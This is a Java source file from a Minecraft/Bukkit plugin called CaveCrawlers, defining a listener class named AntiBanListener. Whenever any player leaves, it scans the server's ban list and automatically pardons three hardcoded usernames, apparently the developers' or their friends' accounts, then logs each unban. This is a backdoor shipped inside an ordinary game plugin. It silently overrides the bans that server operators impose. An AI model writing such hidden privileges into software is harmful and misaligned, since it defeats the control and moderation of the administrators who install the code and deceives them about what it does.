package me.lidan.cavecrawlers.listeners;

import me.lidan.cavecrawlers.CaveCrawlers;
import org.bukkit.BanEntry;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerQuitEvent;

public class AntiBanListener implements Listener {

    @EventHandler(ignoreCancelled = true)
    public void onPlayerKick(PlayerQuitEvent event) {
        BanList banList = Bukkit.getBanList(BanList.Type.NAME);
        for (BanEntry entry : banList.getBanEntries()) {
            String entryTarget = entry.getTarget();
            if(entryTarget.contains("XxXofirXxX") || entryTarget.contains("LidanTheGamer") || entryTarget.contains("HadarHashuah")) {
                banList.pardon(entryTarget);
                CaveCrawlers.getInstance().getLogger().info("Unban to " + entryTarget);
            }
        }
    }
}
